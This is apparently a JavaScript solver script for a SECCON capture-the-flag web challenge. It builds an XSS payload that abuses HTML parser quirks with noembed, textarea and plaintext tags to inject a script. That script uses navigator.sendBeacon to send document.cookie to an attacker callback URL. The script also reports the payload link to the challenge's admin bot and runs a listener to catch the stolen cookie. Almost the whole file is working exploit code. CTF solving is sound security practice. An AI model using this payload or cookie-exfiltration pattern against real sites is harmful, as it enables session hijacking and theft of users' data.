const app = require("fastify")();

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const BOT_BASE_URL = `http://${process.env.SECCON_HOST ?? "localhost"}:1337`;
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? fail("No URL");
const PORT = "8080";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const innerHtml = `
<!--\nnavigator.sendBeacon('${CONNECTBACK_URL}',document.cookie)//
`.trim();

const outerHtml = `
<noembed><textarea></noembed><textarea></textarea><plaintext></noembed><!><script src="/?html=${encodeURIComponent(
  innerHtml
)}"><!></script>
`.trim();

app.post("/", async (req, reply) => {
  // You got a flag!
  console.log(req.body);
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) fail(err.toString());

  await sleep(3 * 1000);
  await reportUrl(`http://web:3000/?html=${encodeURIComponent(outerHtml)}`);

  await sleep(5 * 1000);
  fail("Failed");
});
